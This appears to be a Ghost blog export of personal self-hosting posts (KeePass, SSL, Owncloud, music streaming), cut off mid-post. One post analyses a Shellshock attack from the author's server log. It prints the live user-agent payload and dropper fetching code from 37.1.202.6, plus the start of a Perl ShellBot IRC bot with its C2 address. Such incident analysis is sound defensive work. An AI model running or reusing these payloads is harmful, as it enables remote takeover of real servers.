everything\nis secure……..\n\n[![jk](http://tams.tech/blog/wp-content/uploads/2016/12/raw.gif)](http://tams.tech/blog/?attachment_id=51)\nlol notSo anyway setup is really simple, it’s just transitioning all the\npasswords that takes all the time.On my Debian PC I installed it from the\nlaunchpad repo, by adding\n\nKeePass repo deb http://ppa.launchpad.net/jtaylor/keepass/ubuntu  xenial main\ndeb-src http://ppa.launchpad.net/jtaylor/keepass/ubuntu  xenial main\nto my /etc/apt/sources.list. (Note that you’ll need to add the key from the\nkeyserver in order to install it). There are also very nice clients for Windows\n[http://sourceforge.net/projects/keepass/files/KeePass%201.x/1.31/KeePass-1.31-Setup.exe/download?accel_key=77%3A1482606730%3Ahttp%253A//keepass.info/download.html%3A3daed592%24ac778960c7170a2a3e65b37730bafab3955c9eb5&click_id=decb285a-ca0c-11e6-a3c8-0200ac1d1d91&source=accel] \n and Android\n[https://f-droid.org/repository/browse/?fdfilter=keepass&fdid=com.android.keepass]\n (Play Store link\n[https://play.google.com/store/apps/details?id=com.android.keepass]), as well as\n numerous options [http://keepass.info/download.html]  for just about every\noperating system you might have used in the past 10 years.\n\nWhen you run it for the first time you’ll need to create your database. Just\nname it passwords.kdbx or something memorable and put it somewhere you can find\nit (I put it in ~/.keepass/). You’ll need the database file later. You also need\nto generate a key pair. This database should be backed up with both a\nhigh-entropy passwordand  a 4096-bit (maximum length) RSA key. A password\nmanager is asingle point of failure, which is the exact reason I avoided them\nfor so long and continue to avoid LastPass. This means that if someone getsinto \nyour .kdbx file, they haveeverything.  Banking info, gmail, all of it. So you\nneed two things – a mostly secure thing that you know, and a very secure thing\nthat youhave. This is important. If you backup a database to a cloud service,\nbut exclude the key, that database will forever remain random noise to anyone\nwho doesn’t have the key, even if they have the password. However, to use the\ndatabase, you have to have the private key locally stored on any device you use\nthe manager on, so you need to also lock it behind a strong passphrase to make\nsure that even if the private key *and * the database are stolen, it gives you a\nfew hours to at least change the passwords on the most valuable accounts, if not\nall of them before the attacker could guess or brute-force your password.\n\nFor linux or mac you can simply run\n\nssh-keygen -b 4096 -t rsa\n\nfrom your terminal. For Windows, you’ll need PuTTYgen\n[https://the.earth.li/~sgtatham/putty/latest/x86/puttygen.exe], for which you\ncan find instructions here. If youonly  have Android, you can use ConnectBot to\ngenerate keys and then copy/paste them into TED to save them as text files. Then\nyou need to transfer them over to your other devices alongside your .kdbx\ndatabase.\n\nSo, let me go back over it again –\n\n 1. Install KeePass clients [http://keepass.info/download.html] to your\n    machines. All of them.\n 2. Generate an RSA key pair.\n 3. Create the database, secured with the key pairand  a strong, high-entropy\n    passcode.\n 4. Change all of your passwords. Take your time, make sure you save afterevery\n    singlechange. I don’t need to impress upon you how precious this data is –\n    it’s the keys to the kingdom.\n 5. Copy the database and private key file to any other devices you intend to\n    log in with.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2016-12-24T22:49:23.000Z","created_by":"1","updated_at":"2016-12-24T22:49:23.000Z","updated_by":"1","published_at":"2016-12-24T22:49:23.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea056762333000133276a","uuid":"42df1ac3-39a3-4f29-9dc5-b0fe5a4538db","title":"An attempt at executing malware on my server I discovered today:","slug":"an-attempt-at-executing-malware-on-my-server-i-discovered-today","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nI discovered an entry in my apache2/access.log today that was trying to pass the following code as a [user agent](https://en.wikipedia.org/wiki/User_agent):\\n\\n() { :;}; /bin/bash -c \\\\\\\"curl -o /tmp/mig http://37.1.202.6/mig;/usr/bin/wget http://37.1.202.6/mig -O /tmp/mig;chmod +x /tmp/mig;/tmp/mig;rm -rf /tmp/mig*\\\\\\\"\\n\\nNow, I obviously didn’t want this arbitrary code executing on my system, but I was curious as to what exactly someone was trying to do by passing code as a user agent. I assumed it wasn’t aimed at me, as I was seeing the log entry and it didn’t seem to have taken over my server. As you may know, [curl](https://en.wikipedia.org/wiki/CURL) is an application which downloads a document from a web page. This is the document which was downloaded from http://37.1.202.6/mig\\n\\n#!/bin/bash mkdir /tmp/.hot curl -O /tmp/.hot/a http://37.1.202.6/a wget -O /tmp/.hot/a http://37.1.202.6/a fetch -O /tmp/.hot/a http://37.1.202.6/a chmod 755 /tmp/.hot/a perl /tmp/.hot/a rm -rf /tmp/.hot\\n\\nWhich is pretty boring. It downloads another script and executes that with perl, then deletes the script, just like the original user-agent string removed itself after executing. So I obviously curled that script thinking I might find something interesting and….oh boy did I! It appears to be a plaintext script that does something…unwarranted — the source code for a piece of malware! Here’s the full text (1948 lines) of that script:\\n\\n#!/usr/bin/perl # ShellBOT # 0ldW0lf - oldwolf@atrix-team.org # - www.atrix-team.org # Stealth ShellBot Versão 0.2 by Thiago X # Feito para ser usado em grandes redes de IRC sem IRCOP enchendo o saco :) # Mudanças: # - O Bot pega o nick/ident/name em uma URL e entra no IRC disfarçado :); # - O Bot agora responde PINGs; # - Você pode definir o prefixo dos comandos nas configurações; # - Agora o Bot procurar pelo processo do apache para rodar como o apache :D; # Comandos: # - Adicionado comando !estatisticas <on/off>; # - Alterado o comando @pacota para @oldpack; # - Adicionado dois novos pacotadores: @udp <ip> <porta> <tempo> e @udpfaixa <faixa de ip> <porta> <tempo>; # - Adicionado um novo portscan -> @fullportscan <ip> <porta inicial> <porta final>; # - Adicionado comando @conback <ip> <porta> com suporte para Windows/Unix :D; # - Adicionado comando: !sair para finalizar o bot; # - Adicionado comando: !novonick para trocar o nick do bot por um novo aleatorio; # - Adicionado comando !entra <canal> <tempo> e !sai <canal> <tempo>; # - Adicionado comando @download <url> <arquivo a ser salvo>; # - Adicionado comando !pacotes <on/off> para ativar/desativar pacotes :); ########## CONFIGURACAO ############ my $processo = '/usr/local/apache/bin/httpd -DSSL'; $servidor='188.166.191.83' unless $servidor; my $porta='80'; my @canais=(\\\"#bo\\\"); my @adms=(\\\"x\\\",\\\"k\\\",\\\"z\\\"); # Anti Flood ( 6/3 Recomendado ) my $linas_max=6; my $sleep=3; my $nick = getnick(); my $ircname = getident2(); my $realname = \\\"uname -sr\\\"; chop (my $realname = `uname -sr`); my $acessoshell = 1; ######## Stealth ShellBot ########## my $prefixo = \\\"!u\\\"; my $estatisticas = 0; my $pacotes = 1; #################################### my $VERSAO = '0.2a'; $SIG{'INT'} = 'IGNORE'; $SIG{'HUP'} = 'IGNORE'; $SIG{'TERM'} = 'IGNORE'; $SIG{'CHLD'} = 'IGNORE'; $SIG{'PS'} = 'IGNORE'; use IO::Socket; use Socket; use IO::Select; chdir(\\\"/\\\"); $servidor=\\\"$ARGV[0]\\\" if $ARGV[0]; $0=\\\"$processo\\\".\\\"\\\\0\\\"; my $pid=fork; exit if $pid; die \\\"Problema com o fork: $!\\\" unless defined($pid); my %irc_servers;\\n\\nSo, we’ve got a perl script and a bunch of Portuguese comments. I punched some of them into google translate and it appears to describe itself as some sort of remote-access tool that uses SSH, perl, and IRC to perform tasks. I’m currently looking further into it and will update further.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>I discovered an entry in my apache2/access.log today that was trying to pass the following code as a <a href=\"https://en.wikipedia.org/wiki/User_agent\">user agent</a>:</p>\n<p>() { :;}; /bin/bash -c &quot;curl -o /tmp/mig <a href=\"http://37.1.202.6/mig;/usr/bin/wget\">http://37.1.202.6/mig;/usr/bin/wget</a> <a href=\"http://37.1.202.6/mig\">http://37.1.202.6/mig</a> -O /tmp/mig;chmod +x /tmp/mig;/tmp/mig;rm -rf /tmp/mig*&quot;</p>\n<p>Now, I obviously didn’t want this arbitrary code executing on my system, but I was curious as to what exactly someone was trying to do by passing code as a user agent. I assumed it wasn’t aimed at me, as I was seeing the log entry and it didn’t seem to have taken over my server. As you may know, <a href=\"https://en.wikipedia.org/wiki/CURL\">curl</a> is an application which downloads a document from a web page. This is the document which was downloaded from <a href=\"http://37.1.202.6/mig\">http://37.1.202.6/mig</a></p>\n<h1 id=\"binbashmkdirtmphotcurlotmphotahttp3712026awgetotmphotahttp3712026afetchotmphotahttp3712026achmod755tmphotaperltmphotarmrftmphot\">!/bin/bash mkdir /tmp/.hot curl -O /tmp/.hot/a <a href=\"http://37.1.202.6/a\">http://37.1.202.6/a</a> wget -O /tmp/.hot/a <a href=\"http://37.1.202.6/a\">http://37.1.202.6/a</a> fetch -O /tmp/.hot/a <a href=\"http://37.1.202.6/a\">http://37.1.202.6/a</a> chmod 755 /tmp/.hot/a perl /tmp/.hot/a rm -rf /tmp/.hot</h1>\n<p>Which is pretty boring. It downloads another script and executes that with perl, then deletes the script, just like the original user-agent string removed itself after executing. So I obviously curled that script thinking I might find something interesting and….oh boy did I! It appears to be a plaintext script that does something…unwarranted — the source code for a piece of malware! Here’s the full text (1948 lines) of that script:</p>\n<h1 id=\"usrbinperlshellbot0ldw0lfoldwolfatrixteamorgwwwatrixteamorgstealthshellbotverso02bythiagoxfeitoparaserusadoemgrandesredesdeircsemircopenchendoosacomudanasobotpegaonickidentnameemumaurleentranoircdisfaradoobotagorarespondepingsvocpodedefiniroprefixodoscomandosnasconfiguraesagoraobotprocurarpeloprocessodoapachepararodarcomooapachedcomandosadicionadocomandoestatisticasonoffalteradoocomandopacotaparaoldpackadicionadodoisnovospacotadoresudpipportatempoeudpfaixafaixadeipportatempoadicionadoumnovoportscanfullportscanipportainicialportafinaladicionadocomandoconbackipportacomsuporteparawindowsunixdadicionadocomandosairparafinalizarobotadicionadocomandonovonickparatrocaronickdobotporumnovoaleatorioadicionadocomandoentracanaltempoesaicanaltempoadicionadocomandodownloadurlarquivoasersalvoadicionadocomandopacotesonoffparaativardesativarpacotesconfiguracaomyprocessousrlocalapachebinhttpddsslservidor18816619183unlessservidormyporta80mycanaisbomyadmsxkzantiflood63recomendadomylinas_max6mysleep3mynickgetnickmyircnamegetident2myrealnameunamesrchopmyrealnameunamesrmyacessoshell1stealthshellbotmyprefixoumyestatisticas0mypacotes1myversao02asigintignoresighupignoresigtermignoresigchldignoresigpsignoreuseiosocketusesocketuseioselectchdirservidorargv0ifargv00processo0mypidforkexitifpiddieproblemacomoforkunlessdefinedpidmyirc_servers\">!/usr/bin/perl # ShellBOT # 0ldW0lf - <a href=\"mailto:oldwolf@atrix-team.org\">oldwolf@atrix-team.org</a> # - www.atrix-team.org # Stealth ShellBot Versão 0.2 by Thiago X # Feito para ser usado em grandes redes de IRC sem IRCOP enchendo o saco :) # Mudanças: # - O Bot pega o nick/ident/name em uma URL e entra no IRC disfarçado :); # - O Bot agora responde PINGs; # - Você pode definir o prefixo dos comandos nas configurações; # - Agora o Bot procurar pelo processo do apache para rodar como o apache :D; # Comandos: # - Adicionado comando !estatisticas &lt;on/off&gt;; # - Alterado o comando @pacota para @oldpack; # - Adicionado dois novos pacotadores: @udp <ip> <porta> <tempo> e @udpfaixa <faixa de ip> <porta> <tempo>; # - Adicionado um novo portscan -&gt; @fullportscan <ip> <porta inicial> <porta final>; # - Adicionado comando @conback <ip> <porta> com suporte para Windows/Unix :D; # - Adicionado comando: !sair para finalizar o bot; # - Adicionado comando: !novonick para trocar o nick do bot por um novo aleatorio; # - Adicionado comando !entra <canal> <tempo> e !sai <canal> <tempo>; # - Adicionado comando @download <url> <arquivo a ser salvo>; # - Adicionado comando !pacotes &lt;on/off&gt; para ativar/desativar pacotes :); ########## CONFIGURACAO ############ my $processo = '/usr/local/apache/bin/httpd -DSSL'; $servidor='188.166.191.83' unless $servidor; my $porta='80'; my @canais=(&quot;#bo&quot;); my @adms=(&quot;x&quot;,&quot;k&quot;,&quot;z&quot;); # Anti Flood ( 6/3 Recomendado ) my $linas_max=6; my $sleep=3; my $nick = getnick(); my $ircname = getident2(); my $realname = &quot;uname -sr&quot;; chop (my $realname = <code>uname -sr</code>); my $acessoshell = 1; ######## Stealth ShellBot ########## my $prefixo = &quot;!u&quot;; my $estatisticas = 0; my $pacotes = 1; #################################### my $VERSAO = '0.2a'; $SIG{'INT'} = 'IGNORE'; $SIG{'HUP'} = 'IGNORE'; $SIG{'TERM'} = 'IGNORE'; $SIG{'CHLD'} = 'IGNORE'; $SIG{'PS'} = 'IGNORE'; use IO::Socket; use Socket; use IO::Select; chdir(&quot;/&quot;); $servidor=&quot;$ARGV[0]&quot; if $ARGV[0]; $0=&quot;$processo&quot;.&quot;\\0&quot;; my $pid=fork; exit if $pid; die &quot;Problema com o fork: $!&quot; unless defined($pid); my %irc_servers;</h1>\n<p>So, we’ve got a perl script and a bunch of Portuguese comments. I punched some of them into google translate and it appears to describe itself as some sort of remote-access tool that uses SSH, perl, and IRC to perform tasks. I’m currently looking further into it and will update further.</p>\n</div>","amp":"56","plaintext":"I discovered an entry in my apache2/access.log today that was trying to pass the\nfollowing code as a user agent [https://en.wikipedia.org/wiki/User_agent]:\n\n() { :;}; /bin/bash -c \"curl -o /tmp/mig http://37.1.202.6/mig;/usr/bin/wget  \nhttp://37.1.202.6/mig  -O /tmp/mig;chmod +x /tmp/mig;/tmp/mig;rm -rf /tmp/mig*\"\n\nNow, I obviously didn’t want this arbitrary code executing on my system, but I\nwas curious as to what exactly someone was trying to do by passing code as a\nuser agent. I assumed it wasn’t aimed at me, as I was seeing the log entry and\nit didn’t seem to have taken over my server. As you may know, curl\n[https://en.wikipedia.org/wiki/CURL] is an application which downloads a\ndocument from a web page. This is the document which was downloaded from \nhttp://37.1.202.6/mig\n\n!/bin/bash mkdir /tmp/.hot curl -O /tmp/.hot/a http://37.1.202.6/a  wget -O\n/tmp/.hot/a http://37.1.202.6/a  fetch -O /tmp/.hot/a http://37.1.202.6/a  chmod\n755 /tmp/.hot/a perl /tmp/.hot/a rm -rf /tmp/.hot\nWhich is pretty boring. It downloads another script and executes that with perl,\nthen deletes the script, just like the original user-agent string removed itself\nafter executing. So I obviously curled that script thinking I might find\nsomething interesting and….oh boy did I! It appears to be a plaintext script\nthat does something…unwarranted — the source code for a piece of malware! Here’s\nthe full text (1948 lines) of that script:\n\n!/usr/bin/perl # ShellBOT # 0ldW0lf - oldwolf@atrix-team.org  # -\nwww.atrix-team.org # Stealth ShellBot Versão 0.2 by Thiago X # Feito para ser\nusado em grandes redes de IRC sem IRCOP enchendo o saco :) # Mudanças: # - O Bot\npega o nick/ident/name em uma URL e entra no IRC disfarçado :); # - O Bot agora\nresponde PINGs; # - Você pode definir o prefixo dos comandos nas configurações;\n# - Agora o Bot procurar pelo processo do apache para rodar como o apache :D; #\nComandos: # - Adicionado comando !estatisticas <on/off>; # - Alterado o comando\n@pacota para @oldpack; # - Adicionado dois novos pacotadores: @udp e @udpfaixa ;\n# - Adicionado um novo portscan -> @fullportscan ; # - Adicionado comando\n@conback com suporte para Windows/Unix :D; # - Adicionado comando: !sair para\nfinalizar o bot; # - Adicionado comando: !novonick para trocar o nick do bot por\num novo aleatorio; # - Adicionado comando !entra e !sai ; # - Adicionado comando\n@download ; # - Adicionado comando !pacotes <on/off> para ativar/desativar\npacotes :); ########## CONFIGURACAO ############ my $processo =\n'/usr/local/apache/bin/httpd -DSSL'; $servidor='188.166.191.83' unless\n$servidor; my $porta='80'; my @canais=(\"#bo\"); my @adms=(\"x\",\"k\",\"z\"); # Anti\nFlood ( 6/3 Recomendado ) my $linas_max=6; my $sleep=3; my $nick = getnick(); my\n$ircname = getident2(); my $realname = \"uname -sr\"; chop (my $realname = uname\n-sr); my $acessoshell = 1; ######## Stealth ShellBot ########## my $prefixo =\n\"!u\"; my $estatisticas = 0; my $pacotes = 1;\n#################################### my $VERSAO = '0.2a'; $SIG{'INT'} =\n'IGNORE'; $SIG{'HUP'} = 'IGNORE'; $SIG{'TERM'} = 'IGNORE'; $SIG{'CHLD'} =\n'IGNORE'; $SIG{'PS'} = 'IGNORE'; use IO::Socket; use Socket; use IO::Select;\nchdir(\"/\"); $servidor=\"$ARGV[0]\" if $ARGV[0]; $0=\"$processo\".\"\\0\"; my $pid=fork;\nexit if $pid; die \"Problema com o fork: $!\" unless defined($pid); my\n%irc_servers;\nSo, we’ve got a perl script and a bunch of Portuguese comments. I punched some\nof them into google translate and it appears to describe itself as some sort of\nremote-access tool that uses SSH, perl, and IRC to perform tasks. I’m currently\nlooking further into it and will update further.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-01-07T01:34:34.000Z","created_by":"1","updated_at":"2017-01-07T01:34:34.000Z","updated_by":"1","published_at":"2017-01-07T01:34:34.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea056762333000133276b","uuid":"120011d3-1284-4cc9-aa8c-02c2b0c579d8","title":"Finally have SSL up!","slug":"finally-have-ssl-up","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nThat’s nifty. Let’s Encrypt is a really amazing service. Not much more really needs said about that.\\n\\nI had some problems because I didn’t set up my Apache config files, but as soon as I set those up as they needed to be (creating a .conf in /etc/apache2/sites-available then enabling it with a2ensite) the automated system worked smoothly.\\n\\nEdit (Jan 23 2017): Due to insecure loading of .jpg files I have added the [Really Simple SSL](https://really-simple-ssl.com/) plugin, which seems to have fixed the issue.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>That’s nifty. Let’s Encrypt is a really amazing service. Not much more really needs said about that.</p>\n<p>I had some problems because I didn’t set up my Apache config files, but as soon as I set those up as they needed to be (creating a .conf in /etc/apache2/sites-available then enabling it with a2ensite) the automated system worked smoothly.</p>\n<p>Edit (Jan 23 2017): Due to insecure loading of .jpg files I have added the <a href=\"https://really-simple-ssl.com/\">Really Simple SSL</a> plugin, which seems to have fixed the issue.</p>\n</div>","amp":"59","plaintext":"That’s nifty. Let’s Encrypt is a really amazing service. Not much more really\nneeds said about that.\n\nI had some problems because I didn’t set up my Apache config files, but as soon\nas I set those up as they needed to be (creating a .conf in\n/etc/apache2/sites-available then enabling it with a2ensite) the automated\nsystem worked smoothly.\n\nEdit (Jan 23 2017): Due to insecure loading of .jpg files I have added the \nReally Simple SSL [https://really-simple-ssl.com/] plugin, which seems to have\nfixed the issue.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-01-19T03:45:24.000Z","created_by":"1","updated_at":"2017-01-19T03:45:24.000Z","updated_by":"1","published_at":"2017-01-19T03:45:24.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea056762333000133276c","uuid":"f6afa400-2e91-4893-912d-413ebfa151ec","title":"All Kinds of fun on the servers! Let's start with Owncloud! (part 1)","slug":"all-kinds-of-fun-on-the-servers-lets-start-with-owncloud-part-1","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nSo I have been up to a *lot* lately. I’ve been tearing into the Android documentation, trying to get a grasp on how that OS handles its applications. I set up an Owncloud file-sharing server, and turned my Raspberry Pi into a audio recorder and then immediately backed that up, wiped that card, and turned it into a media center PC! I also finally [got SSL set up](https://tams.tech/blog/index.php/2017/01/19/finally-have-ssl-up/). As I’ve been striving to decrease my dependency on services that mine my data (I originally partook in them wholeheartedly so as to gather data about myself), deciding that it was time to move to more self-hosted options, a basic Owncloud server seemed like a must-have.\\n\\nBefore I began my installation of Owncloud, I backed up a snapshot of this server, in case something went awry during setup. Fortunately, it doesn’t seem anything has, and I have not had to roll back. In fact, I’ve been genuinely surprised at how easy and straightforward the setup was.\\n\\nSince I (obviously) already have a working Apache webserver, installing Owncloud was as simple as unzipping the most recent [.tar.gz](https://download.owncloud.org/community/owncloud-9.1.3.tar.bz2) file into a subdirectory of my /var/www/html/ folder, then modifying the permissions to allow Apache access to the files. From there, I navigated to the local ip of my webserver, where I was presented with a page asking me to install a series of dependencies. After about a half-dozen or so tries with various *apt-get* commands, I managed to get all the dependencies installed, and established and administrator account, using an automatically-generated password that I keep in my [KeePass database](https://tams.tech/blog/index.php/2016/12/24/finally-getting-around-to-proper-password-management/).\\n\\nInitially I was stuck, because folders that I shared with the VM couldn’t be accessed by the owncloud application, meaning anything I hosted on the Owncloud installation would have to be stored twice on my hard drive – a seriously unacceptable situation considering how harshly I ration the half-dozen or so terabytes I have. After a brief chat on the IRC channel, I found very simple solution in Samba/SMB. I installed the Samba server on my main machine, then added *samba-client, smbfs* and *cifs-utils,* then added the proper folders to my */etc/samba/smb.conf *and the webserver’s */etc/**fstab* with the *cifs* filesystem type and *credentials=/credentials/file/* as suggested by [this post](http://askubuntu.com/questions/157128/proper-fstab-entry-to-mount-a-samba-share-on-boot). I mounted my music folders directly to the data/user/files folder of each user in my family so that each of us has a folder that we can access through ssh or owncloud to store our music in. In the next post, I’ll talk about the surprisingly simple music streaming setup that has absolutely no instructions for setup anywhere.\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>So I have been up to a <em>lot</em> lately. I’ve been tearing into the Android documentation, trying to get a grasp on how that OS handles its applications. I set up an Owncloud file-sharing server, and turned my Raspberry Pi into a audio recorder and then immediately backed that up, wiped that card, and turned it into a media center PC! I also finally <a href=\"https://tams.tech/blog/index.php/2017/01/19/finally-have-ssl-up/\">got SSL set up</a>. As I’ve been striving to decrease my dependency on services that mine my data (I originally partook in them wholeheartedly so as to gather data about myself), deciding that it was time to move to more self-hosted options, a basic Owncloud server seemed like a must-have.</p>\n<p>Before I began my installation of Owncloud, I backed up a snapshot of this server, in case something went awry during setup. Fortunately, it doesn’t seem anything has, and I have not had to roll back. In fact, I’ve been genuinely surprised at how easy and straightforward the setup was.</p>\n<p>Since I (obviously) already have a working Apache webserver, installing Owncloud was as simple as unzipping the most recent <a href=\"https://download.owncloud.org/community/owncloud-9.1.3.tar.bz2\">.tar.gz</a> file into a subdirectory of my /var/www/html/ folder, then modifying the permissions to allow Apache access to the files. From there, I navigated to the local ip of my webserver, where I was presented with a page asking me to install a series of dependencies. After about a half-dozen or so tries with various <em>apt-get</em> commands, I managed to get all the dependencies installed, and established and administrator account, using an automatically-generated password that I keep in my <a href=\"https://tams.tech/blog/index.php/2016/12/24/finally-getting-around-to-proper-password-management/\">KeePass database</a>.</p>\n<p>Initially I was stuck, because folders that I shared with the VM couldn’t be accessed by the owncloud application, meaning anything I hosted on the Owncloud installation would have to be stored twice on my hard drive – a seriously unacceptable situation considering how harshly I ration the half-dozen or so terabytes I have. After a brief chat on the IRC channel, I found very simple solution in Samba/SMB. I installed the Samba server on my main machine, then added <em>samba-client, smbfs</em> and <em>cifs-utils,</em> then added the proper folders to my */etc/samba/smb.conf *and the webserver’s */etc/*<em>fstab</em> with the <em>cifs</em> filesystem type and <em>credentials=/credentials/file/</em> as suggested by <a href=\"http://askubuntu.com/questions/157128/proper-fstab-entry-to-mount-a-samba-share-on-boot\">this post</a>. I mounted my music folders directly to the data/user/files folder of each user in my family so that each of us has a folder that we can access through ssh or owncloud to store our music in. In the next post, I’ll talk about the surprisingly simple music streaming setup that has absolutely no instructions for setup anywhere.</p>\n</div>","amp":"68","plaintext":"So I have been up to alot  lately. I’ve been tearing into the Android\ndocumentation, trying to get a grasp on how that OS handles its applications. I\nset up an Owncloud file-sharing server, and turned my Raspberry Pi into a audio\nrecorder and then immediately backed that up, wiped that card, and turned it\ninto a media center PC! I also finally got SSL set up\n[https://tams.tech/blog/index.php/2017/01/19/finally-have-ssl-up/]. As I’ve been\nstriving to decrease my dependency on services that mine my data (I originally\npartook in them wholeheartedly so as to gather data about myself), deciding that\nit was time to move to more self-hosted options, a basic Owncloud server seemed\nlike a must-have.\n\nBefore I began my installation of Owncloud, I backed up a snapshot of this\nserver, in case something went awry during setup. Fortunately, it doesn’t seem\nanything has, and I have not had to roll back. In fact, I’ve been genuinely\nsurprised at how easy and straightforward the setup was.\n\nSince I (obviously) already have a working Apache webserver, installing Owncloud\nwas as simple as unzipping the most recent .tar.gz\n[https://download.owncloud.org/community/owncloud-9.1.3.tar.bz2] file into a\nsubdirectory of my /var/www/html/ folder, then modifying the permissions to\nallow Apache access to the files. From there, I navigated to the local ip of my\nwebserver, where I was presented with a page asking me to install a series of\ndependencies. After about a half-dozen or so tries with variousapt-get \ncommands, I managed to get all the dependencies installed, and established and\nadministrator account, using an automatically-generated password that I keep in\nmy KeePass database\n[https://tams.tech/blog/index.php/2016/12/24/finally-getting-around-to-proper-password-management/]\n.\n\nInitially I was stuck, because folders that I shared with the VM couldn’t be\naccessed by the owncloud application, meaning anything I hosted on the Owncloud\ninstallation would have to be stored twice on my hard drive – a seriously\nunacceptable situation considering how harshly I ration the half-dozen or so\nterabytes I have. After a brief chat on the IRC channel, I found very simple\nsolution in Samba/SMB. I installed the Samba server on my main machine, then\nadded samba-client, smbfs  andcifs-utils,  then added the proper folders to\nmy */etc/samba/smb.conf *and the webserver’s */etc/*fstab  with thecifs \nfilesystem type andcredentials=/credentials/file/  as suggested by this post\n[http://askubuntu.com/questions/157128/proper-fstab-entry-to-mount-a-samba-share-on-boot]\n. I mounted my music folders directly to the data/user/files folder of each user\nin my family so that each of us has a folder that we can access through ssh or\nowncloud to store our music in. In the next post, I’ll talk about the\nsurprisingly simple music streaming setup that has absolutely no instructions\nfor setup anywhere.","feature_image":null,"featured":0,"page":0,"status":"published","locale":null,"visibility":"public","meta_title":null,"meta_description":null,"author_id":"1","created_at":"2017-01-24T19:42:16.000Z","created_by":"1","updated_at":"2017-01-24T19:42:16.000Z","updated_by":"1","published_at":"2017-01-24T19:42:16.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"og_image":null,"og_title":null,"og_description":null,"twitter_image":null,"twitter_title":null,"twitter_description":null,"custom_template":null},{"id":"5b8ea056762333000133276d","uuid":"93abd80f-a5d9-410f-8fe2-ad4484d2b120","title":"Fun with servers part 2 -- Music Streaming","slug":"70","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"\\nI was subscribed to Google Play Music for about 3 or 4 years. I was an early adopter of it, and I got the family plan as soon as that came out as well. I always said that it was the least I could do to support the artists I listen to. However, I began finding that the Google Play library didn’t include everything I wanted to listen to. Furthermore, it only allows streaming of lossy quality audio, and considering my recent push to more open-source solutions, it seemed like the logical next step to have a locally-stored library at home that I could stream to my phone while I’m out.  \\n  \\n First, I tried [Subsonic](http://www.subsonic.org/pages/index.jsp), which, to be fair, worked *excellently* out of the box. Unfortunately, [after 30 days](http://www.subsonic.org/pages/premium.jsp) you have to pay $1 a month, which I would have totally done if it weren’t for the fact that the source had been closed as of the most recent version. This was an effort to have an explicitly open-source solution, so that was no longer really an option.\\n\\nThe next logical step was to try [Libresonic](https://libresonic.org), a fork of the subsonic project from the point where the source was closed. Unfortunately, I was unable to successfully set up a working Libresonic server. At one point I had the interface working but there was no audio. The documentation was incomplete and there were no readily apparent support resources, so I thought I’d hit a dead end. I copied over some essentials from my library to my phone and sucked it up for awhile. It seems to be in active development though, so maybe I’ll look into it again later.\\n\\n[Owncloud](https://owncloud.org/) actually had nothing to do with this search for a music streaming service. I decided to set that up just on a whim, for the obvious purpose of a cloud storage system. Setup was *much* easier than the last time I set up Owncloud a few years ago, you can read about that in [part one](https://tams.tech/blog/index.php/2017/01/24/all-kinds-of-fun-on-the-servers-lets-start-with-owncloud-part-1/). At some point I read that Owncloud supported music streaming through the [Ampache](http://ampache.org/) protocol, which I’d heard about before. As soon as I had set up the base system I went straight into looking for that.\\n\\nInstallation was a breeze. I just went to my Owncloud installation’s *apps*[folder and cloned](https://github.com/owncloud/music/wiki/How-To-Install) the[ git repository](https://github.com/owncloud/music.wiki.git), then opened up the web interface, clicked the drop-down on the top left, then the big “**+ Apps**” button. That took me to a list of available Owncloud applications, and at the bottom was the “Music” app – I simply clicked enable and it was there. Since I had already set up my music folder to be in my Owncloud database with Samba, so it simply scanned for info tags, and I was able to stream music right away.\\n\\nNow for the downside – Android. The [Owncloud app](https://f-droid.org/repository/browse/?fdfilter=owncloud&fdid=com.owncloud.android) works nicely for file sharing, but the only app I was able to successfully connect to my server and sign in with was [*Just Player*](https://f-droid.org/repository/browse/?fdfilter=just+player&fdid=jp.co.kayo.android.localplayer) which is, to be blunt, ugly as fuck. So I’m still downloading my music to my phone, I just have a quick and easy way to do that now, even while I’m out. If you really have to stream your music to Android, Just Player works if you have the [Ampache plugin](https://f-droid.org/repository/browse/?fdfilter=just+player&fdid=jp.co.kayo.android.localplayer.ds.ampache).\\n\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<div class=\"kg-card-markdown\"><p>I was subscribed to Google Play Music for about 3 or 4 years. I was an early adopter of it, and I got the family plan as soon as that came out as well. I always said that it was the least I could do to support the artists I listen to. However, I began finding that the Google Play library didn’t include everything I wanted to listen to. Furthermore, it only allows streaming of lossy quality audio, and considering my recent push to more open-source solutions, it seemed like the logical next step to have a locally-stored library at home that I could stream to my phone while I’m out.</p>\n<p>First, I tried <a 